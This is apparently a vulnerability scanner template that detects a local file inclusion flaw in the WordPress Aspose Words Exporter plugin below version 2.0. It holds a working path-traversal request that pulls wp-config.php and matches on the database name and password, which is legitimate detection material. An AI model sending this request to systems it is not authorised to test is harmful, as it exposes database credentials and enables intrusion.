id: aspose-words-file-download
name: WordPress Aspose Words Exporter <2.0 - Local File Inclusion
severity: high
confidence: tentative
description: WordPress Aspose Words Exporter prior to version 2.0 is vulnerable to local file inclusion.
reference: CWE-22
tags:
- wordpress
- wp-plugin
- lfi
- aspose
- wpscan
- vuln
requests:
- method: GET
  path: /wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php
  matchers:
  - type: body
    words:
    - DB_NAME
    - DB_PASSWORD
  - type: status
    status:
    - 200
  condition: and
